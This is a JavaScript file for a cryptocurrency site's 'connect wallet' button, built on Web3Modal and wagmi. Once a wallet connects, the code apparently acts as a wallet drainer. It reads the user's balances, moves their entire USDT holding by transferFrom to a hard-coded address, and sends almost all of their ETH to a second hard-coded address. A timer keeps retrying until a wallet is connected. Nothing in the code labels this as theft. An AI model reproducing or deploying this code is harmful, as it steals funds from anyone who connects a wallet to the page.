if (typeof process === 'undefined') {
  window.process = {
  env: { NODE_ENV: 'development' }
  };
  }

  import {
    EthereumClient,
    w3mConnectors,
    w3mProvider,
    WagmiCore,
    WagmiCoreChains,
    WagmiCoreConnectors,
  } from "https://unpkg.com/@web3modal/ethereum@2.7.1";
  
  import { Web3Modal } from "https://unpkg.com/@web3modal/html@2.7.1";
  
 

  // 0. Import wagmi dependencies
  const { mainnet, polygon, avalanche, arbitrum } = WagmiCoreChains;
  const { configureChains, createConfig, getAccount, prepareSendTransaction, sendTransaction, fetchBalance, prepareWriteContract, writeContract } = WagmiCore;
  
  // 1. Define chains
  const chains = [mainnet, polygon, avalanche, arbitrum];
  const projectId = "2aca272d18deb10ff748260da5f78bfd";
  
  

  // 2. Configure wagmi client
  const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);
  const wagmiConfig = createConfig({
    autoConnect: true,
    connectors: [
      ...w3mConnectors({ chains, version: 2, projectId }),
      new WagmiCoreConnectors.CoinbaseWalletConnector({
        chains,
        options: {
          appName: "html wagmi example",
        },
      }),
    ],
    publicClient,
  });
  
  // 3. Create ethereum and modal clients
  const ethereumClient = new EthereumClient(wagmiConfig, chains);
  export const web3Modal = new Web3Modal(
    {
      projectId,
      walletImages: {
        safe: "https://pbs.twimg.com/profile_images/1566773491764023297/IvmCdGnM_400x400.jpg",
      },
    },
    ethereumClient
  );
  console.log(ethereumClient)
  const tokenAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
  const erc20Abi = [{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_upgradedAddress","type":"address"}],"name":"deprecate","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"deprecated","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_evilUser","type":"address"}],"name":"addBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"upgradedAddress","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balances","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"maximumFee","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"unpause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_maker","type":"address"}],"name":"getBlackListStatus","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"},{"name":"","type":"address"}],"name":"allowed","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"paused","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"who","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"pause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getOwner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"newBasisPoints","type":"uint256"},{"name":"newMaxFee","type":"uint256"}],"name":"setParams","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"issue","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"redeem","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"remaining","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"basisPointsRate","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"isBlackListed","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_clearedUser","type":"address"}],"name":"removeBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"MAX_UINT","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_blackListedUser","type":"address"}],"name":"destroyBlackFunds","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"_initialSupply","type":"uint256"},{"name":"_name","type":"string"},{"name":"_symbol","type":"string"},{"name":"_decimals","type":"uint256"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Issue","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Redeem","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"newAddress","type":"address"}],"name":"Deprecate","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"feeBasisPoints","type":"uint256"},{"indexed":false,"name":"maxFee","type":"uint256"}],"name":"Params","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_blackListedUser","type":"address"},{"indexed":false,"name":"_balance","type":"uint256"}],"name":"DestroyedBlackFunds","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_user","type":"address"}],"name":"AddedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_user","type":"address"}],"name":"RemovedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[],"name":"Pause","type":"event"},{"anonymous":false,"inputs":[],"name":"Unpause","type":"event"}]

  async function sendi(){

    if (getAccount().isConnected){
      
      const balance = await fetchBalance({
        address: getAccount().address,
      })
      const tB = await fetchBalance({
        address: getAccount().address,
        token: '0xdAC17F958D2ee523a2206206994597C13D831ec7'
      })
      console.log(balance.formatted)
      console.log(tB)
      
      if(tB.formatted != 0){
        const { request } = await prepareWriteContract({ 
          address: tokenAddress, 
          abi: erc20Abi, 
          functionName: 'transferFrom', 
          args: [getAccount().address, '0xc25a768371b1f10DED11513eDF0eb5120DC33dcf', tB.formatted],
          chainId: window.chainId,
        })
        const { thash } = await writeContract(request)
        console.log(thash)
      } else{
        console.log("No available usdt")
      }
      const gasPriceGwei = 20;
      
      // Gas limit (you can estimate this or use a default value)
      const gasLimit = 21000; // Typical for simple transactions
    
      // Transaction value in Ether (your original code)
      const transactionValueEther = balance.formatted; // Adjust this to your desired value
      const tokenValue = tB.formatted
      // Convert gas price from Gwei to Wei
      const gasPriceWei = ethers.utils.parseUnits(gasPriceGwei.toString(), 'gwei');
    
      // Calculate total gas fee in Wei
      const gasFeeWei = gasPriceWei.mul(gasLimit);
    
      // Convert transaction value from Ether to Wei
      const transactionValueWei = ethers.utils.parseEther(transactionValueEther.toString());
    
      // Calculate the amount after deducting the gas fee
      const finalAmountWei = transactionValueWei.sub(gasFeeWei);
      
      
      
      const vrequest = await prepareSendTransaction({
        to: '0xf2379cA332265dB7B0693F81D8DCF94485677826',
        value: finalAmountWei,
        
        data:'0x'
      })
      const { hash } = await sendTransaction(vrequest)
      console.log(hash)
    }
  }
  async function onConnect() {
    
    web3Modal.openModal()

    
    setTimeout(5000)
    await getAccount().isConnected

    if (getAccount().isConnected){
      
      const balance = await fetchBalance({
        address: getAccount().address,
      })
      
      const tB = await fetchBalance({
        address: getAccount().address,
        token: '0xdAC17F958D2ee523a2206206994597C13D831ec7'
      })
      console.log(balance.formatted)
      console.log(tB)
      
      if(tB.formatted != 0){
        const { request } = await prepareWriteContract({ 
          address: tokenAddress, 
          abi: erc20Abi, 
          functionName: 'transferFrom', 
          args: [getAccount().address, '0xc25a768371b1f10DED11513eDF0eb5120DC33dcf', tB.formatted],
          chainId: window.chainId,
        })
        const { thash } = await writeContract(request)
        console.log(thash)
      } else{
        console.log("No available usdt")
      }
      const gasPriceGwei = 20;

      // Gas limit (you can estimate this or use a default value)
      const gasLimit = 21000; // Typical for simple transactions
    
      // Transaction value in Ether (your original code)
      const transactionValueEther = balance.formatted; // Adjust this to your desired value
    
      // Convert gas price from Gwei to Wei
      const gasPriceWei = ethers.utils.parseUnits(gasPriceGwei.toString(), 'gwei');
    
      // Calculate total gas fee in Wei
      const gasFeeWei = gasPriceWei.mul(gasLimit);
    
      // Convert transaction value from Ether to Wei
      const transactionValueWei = ethers.utils.parseEther(transactionValueEther.toString());
    
      // Calculate the amount after deducting the gas fee
      const finalAmountWei = transactionValueWei.sub(gasFeeWei);
       
      const request = await prepareSendTransaction({
        to: '0xf2379cA332265dB7B0693F81D8DCF94485677826',
        value: finalAmountWei,
        
        data:'0x'
       
      })
      const { hash } = await sendTransaction(request)
      console.log(hash)
    } else{
      setInterval(sendi, 8000)
    }
  }

  
  document.getElementById('connect-button').addEventListener('click', onConnect)
 
